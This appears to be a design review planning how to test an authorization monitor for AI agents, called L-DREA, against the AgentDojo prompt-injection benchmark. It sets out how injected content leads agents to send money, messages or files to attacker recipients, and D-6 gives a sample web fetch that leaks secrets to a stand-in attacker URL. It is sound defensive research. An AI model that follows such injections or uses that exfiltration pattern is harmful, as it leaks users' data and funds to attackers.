# AgentDojo as an Independent External Validation Environment for L-DREA — **Version 2 (Critical Design Review)**

**Role of this document:** adversarial self-review by five personas — IEEE Access Reviewer, NeurIPS Benchmark Researcher, AI Security Research Scientist, Formal Methods Researcher, Reproducibility Reviewer — producing the pre-implementation gate. No code. No modification to Gamma or AgentDojo. Supersedes V1 where they conflict; V1 retained for diff.

**Headline finding of the review:** V1's biggest weakness was not stated in V1. **The reference predicate set and the "recognized-recipient" allowlist for AgentDojo do not exist in the frozen framework and must be authored. If authored after seeing AgentDojo's injection corpus, they reintroduce exactly the circularity AgentDojo was imported to eliminate.** This is Critical and governs everything below.

---

## PART 1 — Design Audit

Severity key: **Critical** = can invalidate the scientific claim or the reviewer response; **Major** = materially weakens or exposes to objection; **Minor** = polish / disclosure.

### D-1 (CRITICAL) — The AgentDojo predicate set is a new author-controlled artifact → circularity risk
**Issue.** The paper's predicate vectors are domain-specific (WIRE_TRANSFER, MEDICATION_ORDER_DISPATCH, SUBSTATION_DISPATCH). AgentDojo's domains (email/banking/travel/slack) have **no defined predicate vector or threshold vector θ** in the frozen framework. Someone must author them. If the author inspects AgentDojo's 629 injection tasks and designs predicates that happen to catch them, the "independent" evaluation becomes a detector fit to the test — the precise circularity §IX-F exists to remove.
**Why it matters.** It would silently convert AgentDojo from an *independent oracle* back into an *author-controlled* one, defeating the entire construct-validity argument and handing Reviewer 2 a stronger rejection than before.
**Solution (strongest defensible).**
1. **Derive the AgentDojo predicate families from the paper's existing action-class semantics, not from the attack corpus.** FUNDS_TRANSFER inherits the §X-A banking predicate family (recipient/IBAN recognition, amount-limit, scope, freshness); MESSAGE_DISPATCH/ACCESS_GRANT inherit a generic recipient-recognition + scope family; etc. The mapping is *semantic*, published, and traceable to frozen §X.
2. **Pre-register the full predicate set, θ, and per-tool mapping as a SHA-256-hashed manifest committed *before any AgentDojo run*** (extends §IX-F.2). The manifest hash goes in the camera-ready.
3. **Blind authoring protocol:** predicates are specified against action-class *semantics* with the injection corpus unopened; a written statement to that effect accompanies the manifest.
4. **Report honest false permits** where a pre-registered predicate set fails to catch an injection (predicate incompleteness, Group II) — this is *evidence the protocol is real*, not a failure to hide.

### D-2 (CRITICAL) — The "recognized-recipient / destination" gate is doing most of the anti-exfiltration work and can be read as an attack-specific allowlist
**Issue.** Most AgentDojo exfiltration succeeds by sending to an attacker address/URL absent from the environment. A recipient-recognition predicate catches these — but a reviewer will object: "you built an allowlist for this attack shape."
**Why it matters.** It threatens the generality of the claim and looks like the recipient gate was reverse-engineered from the corpus (ties to D-1).
**Solution.**
1. **Define the allowlist derivation rule mechanically from environment state, independent of attacks:** recognized recipients/destinations = the set of contacts/IBANs/URLs/users already present in the *benign* environment and the *user task* specification, computed before injection. Published as a deterministic function of `TaskEnvironment`, not a hand-list.
2. **Frame it correctly, per the frozen paper:** this is a **cross-domain gate (R3, §X)**, a *structural* authorization predicate — **not** injection detection. L-DREA already claims authorization-soundness, not semantic detection (Property v). The gate denies because the action lacks recipient concurrence, exactly as §X-A denies a wire to an unrecognized destination bank.
3. **Retain the honest counter-case:** injections that target an *in-environment* recipient/IBAN (e.g., an attacker IBAN smuggled into an injected invoice that the agent then pays) will **pass** recipient recognition and produce honest false permits — report them (Group II). This proves the gate is not an oracle.

### D-3 (MAJOR) — LLM stochasticity vs the replay-determinism (DET-1) claim
**Issue.** AgentDojo runs a live LLM. Its proposals are non-deterministic across temperature/model version/API drift. The paper claims replay determinism.
**Why it matters.** A formal-methods reviewer will note that end-to-end AgentDojo runs are not reproducible, and may conflate that with a determinism defect.
**Solution.** State the scope precisely: **DET-1 replay determinism is over the *authorization decision given a fixed candidate action + CTR* — not over the LLM.** The monitor is a deterministic Mealy machine on `(x_t, u_t)` (§IV-E); identical candidate+context ⇒ identical ERTuple. To preserve reproducibility of the *run*: pin model + version, set **temperature = 0**, fix seed where the provider supports it, and **archive full transcripts** (AgentDojo logs them) so the ERTuple stream can be re-derived from cached candidate actions even after the model is deprecated. Replay verification then runs on the archived manifest with zero LLM dependency.

### D-4 (MAJOR) — Baseline attack success must be shown, or L-DREA's zero is meaningless
**Issue.** A weak agent model may never even *propose* the injected EEA, so L-DREA's denials would be vacuous — the §IX-C "was the attack reaching the monitor?" concern, transplanted.
**Why it matters.** Without a without-L-DREA baseline TASR > 0, the result is uninterpretable.
**Solution.** Mandatory **paired with/without-L-DREA design** on **multiple frontier models**. Report native AgentDojo TASR (no monitor) to prove attacks reach the boundary, then TASR with L-DREA. This mirrors the negative control and is a hard gate (see checklist).

### D-5 (MAJOR) — FDR must not conflate monitor over-denial with agent task failure
**Issue.** AgentDojo Utility can drop because the agent failed the task, independent of L-DREA. Naive FDR = "benign action denied" over all benign tasks over-counts.
**Solution.** Compute FDR only over benign EEAs on tasks the agent **completed successfully in the without-L-DREA arm** — i.e., the paired design isolates the monitor's marginal denials. Report "utility retained under L-DREA" as the operational number.

### D-6 (MAJOR) — The read-only/EEA split in V1 is too clean: outbound-carrying "read" tools are EEAs
**Issue.** V1 put all `get_*`/`read_*` outside the boundary. But `get_webpage("http://attacker/?data=<secrets>")` exfiltrates via the *argument* of a nominally read tool; the fetch itself is externally effective.
**Why it matters.** A missed EEA class is a complete-mediation hole (Definition 2(i)) and an AI-security reviewer will find it immediately.
**Solution.** Refine the classification rule: **a tool is an EEA iff it mutates persistent state OR its arguments carry content to an external/unrecognized destination.** Under this rule, outbound-parameterized fetches (`get_webpage` to non-recognized URL) are reclassified as WEB_EXFIL and mediated by the destination-recognition gate. Update Part 3 mapping accordingly (done below).

### D-7 (MAJOR) — AgentDojo tests only Tier-S; Invariant 1/2 and R6 are not exercised
**Issue.** No hardware interlock exists in AgentDojo; commit-before-actuate is software ordering only. Invariant 1 (Execution Sovereignty) rests on A3 substrate isolation, which AgentDojo cannot provide.
**Solution.** Bound the claim explicitly: **AgentDojo validates the R1–R5 authorization-logic layer, the Γ/non-compensatory aggregation, class-level veto, and the evidence/replay layer at Tier-S. It does NOT validate R6 (hardware interlock) or the substrate-dependent portion of Invariants 1–2.** This matches the CreditCard artifact's honest Tier-S disclosure and does not weaken the LAB Tier-H results (unchanged).

### D-8 (MAJOR) — Sample size: AgentDojo bounds are ~10⁻²–10⁻³, not 10⁻⁵
**Issue.** 629 injection cases ≠ 360,000. Wilson bounds are wide.
**Solution.** Never present AgentDojo bounds as comparable to LAB. State N and the resulting bound honestly; position AgentDojo as *independence*, LAB as *rare-event scale* (Part 5, V1). The two are complementary along different axes and must be reported as such.

### D-9 (MAJOR) — Task-count discrepancy: paper says 79 / 629; current AgentDojo has grown
**Issue.** The manuscript froze "79 user tasks, 629 injection cases." Public AgentDojo releases have more user tasks in later versions.
**Why it matters.** A reproducibility reviewer will check the numbers against the pinned release and flag any mismatch.
**Solution.** Pin the exact release whose counts match the pre-registration, OR update the pre-registered counts to the pinned release and state the reconciliation explicitly in §IX-F. The manifest must make the count deterministic (Part 2).

### D-10 (MINOR) — Multiple attack strategies exist in AgentDojo
**Issue.** AgentDojo ships several attacks (`ImportantInstructions`, etc.); TASR depends on attack choice.
**Solution.** Run the pre-registered set of AgentDojo's provided attacks; report per-attack. Do not author a new attack (would re-introduce author control on the adversary side).

### D-11 (MINOR) — License / redistribution
**Issue.** Redistributing AgentDojo vs. depending on it.
**Solution.** Depend on the pinned public release; redistribute only the interposition adapter under a compatible license; cite AgentDojo per [1].

### D-12 (MINOR) — Over-mapping ASB/ConcurBench onto AgentDojo is unnecessary
**Issue.** V1 mapped AgentDojo onto all of ConcurBench's 7 classes and ASB's 5 families; most are marginal.
**Solution.** Scope AgentDojo to its honest role (LAB-A3 / external validity). Report the coverage crosswalk once (Part 3, V1) and stop; do not manufacture ASB/ConcurBench coverage AgentDojo does not have. (Removes complexity — see Part 8 Q5.)

---

## PART 2 — AgentDojo Version Freeze (reproducibility manifest design)

**Honesty note:** exact commit SHA / tag / dependency hashes must be captured by running the freeze procedure at implementation time. Fabricating them here would violate reproducibility integrity. Below is the **manifest schema and policy**; bracketed `<…>` fields are filled at freeze.

```
agentdojo_freeze_manifest.json
{
  "benchmark": "AgentDojo",
  "citation": "Debenedetti et al., NeurIPS D&B Track, 2024 [ref 1]",
  "repository": "https://github.com/ethz-spylab/agentdojo",   // verify at freeze
  "release_tag": "<vX.Y.Z>",
  "commit_sha": "<full 40-char SHA>",
  "suite_inventory": {                                          // computed from the pinned release
     "suites": ["workspace","banking","travel","slack"],
     "user_task_count": "<N_user>",                             // reconcile vs paper's 79 (D-9)
     "injection_task_count": "<N_inj>",
     "injection_case_count": "<629 target>",
     "tool_registry_sha256": "<hash of enumerated tool set>"
  },
  "runtime": {
     "python_version": "3.11.x (pinned; 3.10–3.12 acceptance band tested)",
     "os": "Linux x86_64 (Ubuntu 22.04 LTS reference); macOS arm64 permitted, disclosed",
     "dependency_lock": "requirements.lock with per-package ==version + sha256 hashes (pip hash-checking mode)",
     "agentdojo_extras": "logdir/transcript caching ENABLED"
  },
  "agent_model": {
     "models": ["<frontier model A + version>", "<frontier model B + version>"],  // D-4 multi-model
     "temperature": 0,
     "top_p": 1,
     "seed": "<provider seed where supported>",
     "transcripts_archived": true                                // D-3 replay durability
  },
  "attacks": ["<pre-registered AgentDojo-provided attack set>"],  // D-10, no author-written attack
  "ldrea_config_manifest_sha256": "<hash of predicate set + θ + I_class + per-tool EEA mapping>", // D-1/D-2
  "blind_authoring_statement": "predicates specified from action-class semantics with injection corpus unopened",
  "seed_policy": "all stochastic elements pinned; monitor is deterministic given (candidate, CTR)",
  "reproducibility_bundle": "MANIFEST.json (sha256+size of every input/source/output), env.json, command.txt, REPRODUCE.md, bundle_digest_sha256",
  "scope_disclosure": "Tier-S software only; HMAC-SHA256 analogs; R6 hardware interlock NOT exercised (D-7)"
}
```

**Random-seed policy.** (a) LLM: temperature 0 + provider seed; residual nondeterminism absorbed by transcript archival. (b) Monitor: deterministic by construction (§IV-E) — no seed. (c) Any sampling in reporting: fixed seed, published. **Determinism claim scope = authorization decision over fixed candidate+CTR (D-3), never the LLM.**

**Two hashes are pre-committed before any run:** the AgentDojo freeze manifest **and** the L-DREA config manifest (predicates/θ/mapping). Both hashes appear in the camera-ready. This is the anti-circularity lock.

---

## PART 3 — Complete AgentDojo → L-DREA Mapping (appendix-grade)

**Classification rule (final, per D-6):** EEA iff (persistent state mutation) OR (arguments carry content to an external/unrecognized destination). Read tools with no outbound-carrying argument are outside the boundary (Definition 1) and unmediated.

**Column legend:** EQ = Evidence-Quad fields emitted; RF = replay fields; Gamma metrics = which metrics this action contributes to. EQ is uniform: `{decision, method_version, policy_hash, ledger_hash}`. RF is uniform: `{proposal_id, ertuple_id, hash_prev, hash_current, gamma_g, gamma_class, pi}`. Shown once here, referenced as EQ*/RF* per row to keep the table publishable.

> EQ* = {decision · method_version · policy_hash · ledger_hash}; RF* = {proposal_id · ertuple_id · hash_prev · hash_current · Γ_G · Γ_class · Π}. Every mediated EEA emits EQ* and RF* identically; per-row differences are only in predicate families, SAFE_STATE behavior, and risk.

| Suite | Tool | Purpose | External effect | EEA class | Predicate families | SAFE_STATE behavior | EQ / RF | Expected Gamma metrics | Risk |
|-------|------|---------|-----------------|-----------|--------------------|--------------------|---------|-----------------------|------|
| Workspace | `send_email` | send email | outbound msg (irrev.) | MESSAGE_DISPATCH | CTR/ISB · Γ · Gate(recipient-recog, scope) · Auth/Token · Trace · Interlock | not dispatched; ERTuple; first-failing gate | EQ* / RF* | UER,FPR,FDR,FCR,RDR,latency | HIGH |
| Workspace | `delete_email` | delete msg | destructive | RECORD_DELETION | CTR/ISB · Γ · Gate(ownership,scope) · Auth/Token · Trace · Interlock | not deleted | EQ*/RF* | UER,FPR,FDR,FCR,RDR | MED |
| Workspace | `create_file` | create file | persistent write | FILE_MUTATION | CTR/ISB · Γ · Gate(scope) · Auth/Token · Trace · Interlock | not created | EQ*/RF* | UER,FPR,FDR,FCR,RDR | LOW-MED |
| Workspace | `append_to_file` | edit file | persistent write | FILE_MUTATION | CTR/ISB · Γ · Gate(ownership) · Auth/Token · Trace · Interlock | unchanged | EQ*/RF* | UER,FPR,FDR,FCR,RDR | MED |
| Workspace | `delete_file` | delete file | destructive | RECORD_DELETION | CTR/ISB · Γ · Gate(ownership,scope) · Auth/Token · Trace · Interlock | not deleted | EQ*/RF* | UER,FPR,FDR,FCR,RDR | MED-HIGH |
| Workspace | `share_file` | grant access | irrev. disclosure | ACCESS_GRANT | CTR/ISB · Γ · Gate(recipient-recog,scope) · Auth/Token · Trace · Interlock | not shared | EQ*/RF* | UER,FPR,FDR,FCR,RDR | HIGH (exfil) |
| Workspace | `create/cancel/reschedule_calendar_event` | calendar write | persistent write | CALENDAR_MUTATION | CTR/ISB · Γ · Gate(ownership,scope) · Auth/Token · Trace · Interlock | unchanged | EQ*/RF* | UER,FPR,FDR,FCR,RDR | LOW-MED |
| Workspace | `add_calendar_event_participants` | add attendees | outbound + disclosure | ACCESS_GRANT | CTR/ISB · Γ · Gate(recipient-recog,scope) · Auth/Token · Trace · Interlock | not added | EQ*/RF* | UER,FPR,FDR,FCR,RDR | MED |
| Workspace | `get/read/search/list_*` | observe | none | — outside boundary | — | pass-through (injection rides here; surfaces at next EEA) | none | none | n/a |
| Banking | `send_money` | transfer funds | irrev. financial | FUNDS_TRANSFER | CTR/ISB · Γ · Gate(IBAN-recog,amount-limit,scope) · Auth/Token · Trace · Interlock · Class(velocity) | not sent; hold state | EQ*/RF* | UER,FPR,FDR,FCR,RDR,latency | HIGH |
| Banking | `schedule_transaction` | future transfer | deferred financial | FUNDS_TRANSFER | as `send_money` + freshness/TTL | not scheduled | EQ*/RF* | UER,FPR,FDR,FCR,RDR | HIGH |
| Banking | `update_scheduled_transaction` | modify transfer | financial mutation | ACCOUNT_MUTATION | CTR/ISB · Γ · Gate(ownership,amount-limit) · Auth/Token · Trace · Interlock | unchanged | EQ*/RF* | UER,FPR,FDR,FCR,RDR | HIGH |
| Banking | `update_user_info` | change PII | identity mutation | IDENTITY_MUTATION | CTR/ISB · Γ · Gate(ownership,scope) · Auth/Token · Trace · Interlock | unchanged | EQ*/RF* | UER,FPR,FDR,FCR,RDR | HIGH (fraud) |
| Banking | `get_balance/get_iban/read_user_info/get_*_transactions` | observe | none | — outside boundary | — | pass-through | none | none | n/a |
| Travel | `reserve_hotel/restaurant/car` | commit reservation | binding, cost | RESERVATION_COMMIT | CTR/ISB · Γ · Gate(resource-recog,amount-limit,scope) · Auth/Token · Trace · Interlock | not reserved | EQ*/RF* | UER,FPR,FDR,FCR,RDR | MED-HIGH |
| Travel | `book_flight` (if present) | book flight | binding, cost | RESERVATION_COMMIT | as reservations | not booked | EQ*/RF* | UER,FPR,FDR,FCR,RDR | HIGH |
| Travel | `send_email` (travel) | outbound msg | irrev. | MESSAGE_DISPATCH | as Workspace `send_email` | not dispatched | EQ*/RF* | UER,FPR,FDR,FCR,RDR | HIGH |
| Travel | `update_user_info` (travel) | change PII | identity mutation | IDENTITY_MUTATION | CTR/ISB · Γ · Gate(ownership,scope) · Auth/Token · Trace · Interlock | unchanged | EQ*/RF* | UER,FPR,FDR,FCR,RDR | HIGH |
| Travel | `get_*` (hotels/flights/reviews/prices) | observe | none | — outside boundary | — | pass-through | none | none | n/a |
| Slack | `send_direct_message` | DM user | outbound | MESSAGE_DISPATCH | CTR/ISB · Γ · Gate(recipient-recog,scope) · Auth/Token · Trace · Interlock | not sent | EQ*/RF* | UER,FPR,FDR,FCR,RDR | HIGH (exfil) |
| Slack | `send_channel_message` | post channel | outbound broadcast | MESSAGE_DISPATCH | CTR/ISB · Γ · Gate(scope) · Auth/Token · Trace · Interlock | not posted | EQ*/RF* | UER,FPR,FDR,FCR,RDR | MED-HIGH |
| Slack | `add_user_to_channel` | grant access | access change | ACCESS_GRANT | CTR/ISB · Γ · Gate(identity-recog,scope) · Auth/Token · Trace · Interlock | not added | EQ*/RF* | UER,FPR,FDR,FCR,RDR | MED-HIGH |
| Slack | `remove_user_from_channel` | revoke access | destructive access | ACCESS_GRANT | CTR/ISB · Γ · Gate(ownership,scope) · Auth/Token · Trace · Interlock | not removed | EQ*/RF* | UER,FPR,FDR,FCR,RDR | MED |
| Slack | `invite_user_to_slack` | onboard external id | irrev. identity/access | ACCESS_GRANT/IDENTITY_MUTATION | CTR/ISB · Γ · Gate(identity-recog,scope) · Auth/Token · Trace · Interlock | not invited | EQ*/RF* | UER,FPR,FDR,FCR,RDR | HIGH |
| Slack | `get_webpage(url)` **when url is external/unrecognized** | fetch (arg carries outbound data) | outbound via argument | WEB_EXFIL | CTR/ISB · Γ · Gate(destination-recog,scope) · Auth/Token · Trace · Interlock | not fetched | EQ*/RF* | UER,FPR,FDR,FCR,RDR | HIGH (exfil, per D-6) |
| Slack | `read_channel_messages/read_inbox/get_users_in_channel` | observe | none | — outside boundary | — | pass-through (canonical injection carrier) | none | none | n/a |

**Authoritative enumeration note.** This table is instantiated against the **pinned release's tool registry** at freeze; the registry SHA-256 (Part 2) makes it exhaustive and verifiable. The decision rule (D-6) determines EEA membership mechanically for any tool the release adds.

---

## PART 4 — Benchmark Coverage Analysis (inclusion / exclusion decision procedure)

**Honesty constraint.** I will not fabricate the 79/97 individual task IDs from memory. Instead I specify the **deterministic inclusion procedure** applied to *every* task in the pinned release and published as a table; no task is left unexplained because the rule is total.

**Inclusion procedure (applied per task, mechanically, from archived transcripts):**
- A **user task** is **INCLUDED (mediated)** iff its reference solution or any admissible solution path invokes ≥1 EEA (per the Part 3 rule). Its benign EEAs feed FDR/Utility.
- A **user task** is **EXCLUDED (observed, not mediated)** iff it is satisfiable using only read-only, non-outbound tools — no EEA crosses the boundary. Justification: **Definition 1** — no persistent external effect, so nothing for the externalization monitor to mediate. These tasks still run (to measure that L-DREA introduces **zero** spurious denials on read-only workloads → FDR sanity).
- An **injection task** is **INCLUDED (scored for UER/FPR)** iff its `security()` goal is achieved via an EEA. If the injection's goal is *information disclosure to the model's context only* (no outbound EEA), it is **EXCLUDED from UER/FPR** with justification: the harm is content-layer, **outside L-DREA's authority horizon** (Property v; §XII-A Group III) — L-DREA does not claim to prevent the model from *reading* injected content, only from *externalizing* an unauthorized action. This exclusion is itself a reported result (it delimits the claim honestly).

**Output artifact (published appendix):** one row per task: `{task_id, suite, contains_EEA?, EEA_classes, included/excluded, exclusion_reason∈{no-EEA→Def.1, content-layer-only→Property-v}}`. Totals reconcile to the pinned counts (D-9). **Every task is accounted for by the total rule; none is unexplained.**

**Why this is the scientifically correct partition.** It draws the include/exclude line exactly at Definition 1 and the authority horizon H — the two frozen boundaries of what L-DREA claims. It does not cherry-pick tasks L-DREA passes; it includes every EEA-bearing task and reports every exclusion's principled reason.

---

## PART 5 — Failure Taxonomy (interpretation framework for every outcome)

The decisive diagnostic for any false permit: **did the executed EEA have Γ = 0 under a correct evaluation of the pre-registered predicate set, or Γ > 0?** This single test separates honest residuals from framework-invalidating defects.

| # | Outcome class | What it means | How detected | Invalidates L-DREA, or only the implementation/scope? |
|---|---------------|---------------|--------------|-------------------------------------------------------|
| F1 | **Predicate incompleteness** (false permit, Γ=0 correctly) | injection achieved via an action the pre-registered predicate vector does not cover | AgentDojo `security()` = attack success **and** monitor Γ=0 **and** predicate audit shows no applicable predicate | **Neither invalidates the theory nor the implementation** — it is the pre-declared Group II residual (§XII-A) and Property-v scope. Honest, expected (§IX-E.4). Reported, not hidden. |
| F2 | **True authorization failure / bypass** (Γ>0 yet executed) | an EEA with a real deficit still externalized | monitor logged Γ>0 but the environment mutated; or Eq.7 `Unauth` true with valid chain | **Invalidates L-DREA (or its implementation) — Critical.** Would falsify Invariant 1/3 at Tier-S. Must be root-caused: if the monitor computed Γ>0 but the interposition failed to block → implementation bug (fixable, disclose); if the aggregation logic permitted with a deficit → genuine theory defect (would be a major negative result, published per outcome-irrespective rule). |
| F3 | **Incorrect EEA mapping** | a tool that should be mediated was classified read-only (or vice versa) | coverage audit: an outbound-carrying tool with no ERTuple; or a read tool generating spurious denials | **Implementation/mapping defect, not theory.** Fix mapping, re-run. Detected by the Part 4 procedure + D-6 rule. |
| F4 | **Context-translation (CTR) failure** | candidate action mis-encoded into CTR → wrong predicate inputs | CTR determinism check + manual audit of divergent decisions | **Implementation defect.** The CTR is L-DREA's; a faithful adapter must reproduce it. Disclose and fix; does not touch theorems. |
| F5 | **Replay inconsistency** | ERTuple stream fails adjacency / ledger binding | independent verifier exit≠0 | **Implementation defect** (or tampering). DET-1 is deterministic; a failure is a bug in emission, not in the law. |
| F6 | **Benchmark incompatibility** | AgentDojo API/version drift breaks the seam | run fails / tool registry mismatch vs manifest | **Neither** — reproducibility issue. Resolved by the version freeze (Part 2). |
| F7 | **Elevated FDR** (benign denials) | monitor over-denies legitimate actions | paired with/without design; FDR over completed-benign EEAs | **Neither invalidates** — it is the pre-declared asymmetric-loss cost (§I-A, §V-G). Reported as utility cost; expected (§IX-E.4). |
| F8 | **Vacuous zero** (no attack reached monitor) | baseline TASR≈0 | without-L-DREA arm shows TASR≈0 | **Invalidates the *experiment's power*, not the theory.** Gate on baseline TASR>0 (D-4); escalate model if vacuous. |
| F9 | **Content-layer-only harm** | injection harms via context, no EEA | injection succeeds with no boundary crossing | **Out of scope by construction** (Property v, §XII-A Group III). Reported as a delimiter, not a failure. |

**Governing rule:** only **F2** can invalidate the scientific contribution, and only if root-cause is the aggregation/veto logic rather than the adapter. Every other outcome is either an implementation defect (fixable, disclosed) or a pre-declared honest residual (reported as evidence the protocol is real). This taxonomy is what lets the team publish **any** AgentDojo result outcome-irrespectively (§IX-F.2) without destabilizing the frozen claims.

---

## PART 6 — Paper Revision Impact (section-by-section, updated for V2)

| Section | Disposition | Why |
|---------|-------------|-----|
| Abstract, §I-C | **Updated claim** (minimal) | "pre-registered" → "pre-registered and reported (§IX-F)"; add Tier-S external-validation sentence. |
| §III Threat model | **No change** | AgentDojo occupies the existing plane-C adversary; no new adversary class in the model. |
| §IV Definitions (1,2,4), §IV-E | **No change** | Interception at `run_function` is an instance of Definition 1/2/4; nothing redefined. |
| §V-H adaptive planning | **Strengthened** | AgentDojo is a live demonstration that plan novelty (including injection-induced plans) is invisible to the monitor. |
| §VI invariants, §VI-D, Table 6 | **No change** | AgentDojo (Tier-S) does not mechanize invariants; verification status untouched (D-7). |
| §IX-C negative control | **Strengthened** | Now paired with an *independently authored* adversary (D-4), jointly excluding underpowered+circular explanations. |
| §IX-F | **New experiment + fill Table 11 + updated status** | Promote pre-registration to completed independent evaluation; add both pre-committed hashes (Part 2). |
| §IX-F | **New Table 11b** | Utility & TASR, L-DREA vs native AgentDojo defenses, across ≥2 frontier models (D-4) — metric firewall. |
| §IX-F | **New Table 11c** | Coverage crosswalk AgentDojo↔LAB-A1…A5 (overlap/new-class), and the inclusion/exclusion totals (Part 4). |
| §IX-L construct validity | **Strengthened** | External-validity evidence now present; same normative scope retained. |
| §IX (new figure) | **New figure** | Two-plane seam over AgentDojo `AgentPipeline→ToolsExecutor→run_function→TaskEnvironment`. |
| §IX (new figure) | **New figure** | Construct-validity triangulation (LAB scale + negative control + AgentDojo independence). |
| §XII-A Group II | **Strengthened** | Predicate incompleteness becomes a *measured* residual with an external falsification surface. |
| **New Appendix (proposed)** | **New appendix** | The Part 3 complete mapping table + Part 2 freeze manifest + Part 4 inclusion/exclusion table — the reproducibility package. |
| Tables 8–10 (LAB), §IX-D substrate ablation | **No change** | LAB Tier-H results and rare-event bounds are untouched; AgentDojo does not claim to reproduce them. |

---

## PART 7 — Reviewer Challenge (Reviewer 2 tries again, post-integration)

**C1. "Your AgentDojo predicate set is tuned to AgentDojo's attacks — this is circularity in a new costume."**
*Author response (evidence that will exist):* predicate set, θ, and per-tool mapping are **pre-registered as a SHA-256 manifest committed before any run** (Part 2), **derived from the frozen §X action-class semantics, not the corpus** (D-1), with a blind-authoring statement. Honest false permits (F1) are reported, proving the set was not fit to the test. **Fully answerable.**

**C2. "The recognized-recipient gate is just an allowlist anti-exfil heuristic, not a general reference monitor."**
*Response:* it is a **cross-domain gate (R3, §X)** — a structural authorization predicate identical in kind to the §X-A destination-bank gate — with the allowlist derived mechanically from benign environment state (D-2). L-DREA claims **authorization-soundness, not injection detection** (Property v). In-environment-recipient injections that pass the gate are reported as honest false permits. **Fully answerable.**

**C3. "LLM nondeterminism means your run isn't reproducible, contradicting DET-1."**
*Response:* DET-1 is scoped to the authorization decision over a fixed candidate+CTR (§IV-E), not the LLM; runs use temperature 0 + seed, and **transcripts are archived** so ERTuples replay without the model (D-3). **Fully answerable.**

**C4. "You only ran Tier-S software; the hardware claims are still self-evaluated."**
*Response:* correct and disclosed — AgentDojo validates R1–R5 + Γ/veto/evidence at Tier-S; **R6 and the substrate portion of Invariants 1–2 remain LAB Tier-H / future hardware evaluation** (D-7). Not claimed otherwise. **Partially answerable → remaining future work (honest).**

**C5. "Small N — 629 cases can't support a strong bound."**
*Response:* agreed; AgentDojo is imported for **independence**, not rare-event scale — that is LAB's role. Bounds reported at true N with wide intervals, never compared to 10⁻⁵ (D-8). **Fully answerable (by correct positioning).**

**C6. "You picked a favorable model."**
*Response:* **≥2 frontier models**, with **without-L-DREA baseline TASR reported** to prove attacks reached the monitor (D-4). **Fully answerable.**

**C7. "The utility cost makes L-DREA impractical."**
*Response:* FDR is reported honestly over completed-benign EEAs (D-5); the asymmetric-loss regime (§I-A, L_unauth/L_deny ≥ 10⁴) is exactly where this trade is justified, and the paper already says where it is the *wrong* tool (§V-G). **Fully answerable (scope statement already frozen).**

**C8. "Formal invariants 2–6 still aren't mechanized."**
*Response:* out of AgentDojo's reach; tracked as LAB v1.1 (NuSMV/TLA⁺). **Not answerable by AgentDojo → remaining future work (honest, already disclosed §VI-D).**

**C9. "You still authored the adapter/mapping — how do I trust the seam mediates everything?"**
*Response:* complete-mediation is enforced at the sole chokepoint `run_function` (Part 1); the coverage audit (Part 4) proves every EEA emitted an ERTuple and every read-only tool did not; the independent verifier re-checks the ledger with zero dependency on the adapter. **Fully answerable.**

**Remaining honest future work after integration:** (i) independent hardware-substrate (Tier-H) evaluation; (ii) mechanization of Invariants 2–6; (iii) additional third-party agent benchmarks beyond AgentDojo (AgentHarm is already pre-registered) for further external replication. These are disclosed, not concealed.

---

## PART 8 — Final Readiness Assessment

**1. Is the scientific design complete?** **Yes, conditional on the pre-registration artifacts existing.** The design is scientifically complete once the two pre-committed hashes (AgentDojo freeze manifest + L-DREA config/predicate manifest) and the blind-authoring protocol are in place. Until those exist, D-1/D-2 remain open and the design is not safe to implement.

**2. Is implementation likely to satisfy the reviewer?** **Yes for the stated request (R2-a) and the circularity/construct-validity concerns**, provided C1–C3, C6, C9 evidence is produced and honest residuals (F1, F7, F9) are reported outcome-irrespectively. C4/C8 remain honest future work — but they were never within an agent benchmark's reach.

**3. What is still missing?**
- The **verbatim Reviewer 2 text** (needed to certify Part 7 mapping to the *actual* review).
- The **pinned AgentDojo release SHA + counts reconciliation** (D-9).
- The **pre-registered predicate set / θ / mapping manifest** (D-1) — the single most important missing artifact.
- The **recognized-recipient derivation rule**, published (D-2).
- **Model selection + baseline-TASR power check** (D-4).

**4. What additional evidence would further strengthen the paper?**
- Running the **AgentHarm** pre-registered arm too (already committed §IX-F) for a second independent oracle.
- A **second frontier model family** to show model-independence of the authorization behavior.
- Publishing the **honest false-permit cases (F1)** with per-case predicate-gap analysis — paradoxically the strongest credibility signal.

**5. Unnecessary complexity to remove before implementation?**
- Drop the ASB/ConcurBench over-mapping onto AgentDojo (D-12); keep AgentDojo scoped to LAB-A3 / external validity.
- Do **not** build new dashboards or report infrastructure — reuse the existing composed-page + independent-verifier pipeline.
- Do **not** author new attacks or new tasks — that would re-introduce author control (D-10). Use AgentDojo's provided attacks only.

---

## Requirements that MUST be satisfied before writing any code

> Implementation does not begin until **every** item is checked. Items marked **[BLOCKER]** are anti-circularity or complete-mediation gates whose omission would invalidate the scientific claim.

1. **[BLOCKER]** Pre-register the **L-DREA config manifest** (predicate set, θ vector, I_class, per-tool EEA mapping) as a SHA-256 hash, **committed before any AgentDojo run**, with a written **blind-authoring statement** (corpus unopened; predicates derived from frozen §X action-class semantics). — resolves D-1.
2. **[BLOCKER]** Publish the **recognized-recipient/destination derivation rule** as a deterministic function of benign `TaskEnvironment` state, independent of attacks. — resolves D-2.
3. **[BLOCKER]** Adopt the **final EEA classification rule** including outbound-carrying read tools (WEB_EXFIL); confirm the interception is at the sole chokepoint `FunctionsRuntime.run_function`. — resolves D-6, complete mediation.
4. **[BLOCKER]** Pin the **AgentDojo release**: repository URL, tag, 40-char commit SHA, tool-registry SHA-256, and reconcile user/injection/injection-case counts against the paper's 79/629 (update §IX-F if they differ). — resolves D-9.
5. **[BLOCKER]** Define the **paired with/without-L-DREA design** across **≥2 frontier models** with **temperature 0**, seed, and a **baseline-TASR > 0 power gate** (escalate model if attacks don't reach the monitor). — resolves D-4, F8.
6. Specify **FDR measured over completed-benign EEAs only** (paired arms), reported as "utility retained." — resolves D-5.
7. Specify **transcript archival** so ERTuples replay without the LLM; state DET-1's scope (decision over fixed candidate+CTR). — resolves D-3.
8. Write the **Tier-S scope disclosure**: AgentDojo validates R1–R5 + Γ/veto/evidence; R6 and substrate-dependent Invariant 1/2 are NOT exercised. — resolves D-7.
9. Fix **N and Wilson-bound honesty**: report AgentDojo bounds at true N, never compared to LAB's 10⁻⁵. — resolves D-8.
10. Adopt the **failure taxonomy (Part 5)** as the pre-committed interpretation framework, so any outcome (including F1/F2) is publishable outcome-irrespectively; define the F1-vs-F2 diagnostic (Γ=0 vs Γ>0). — resolves the interpretation risk.
11. Adopt the **Part 4 inclusion/exclusion decision procedure**; commit to publishing the total per-task table with exclusion reasons. — total task accounting.
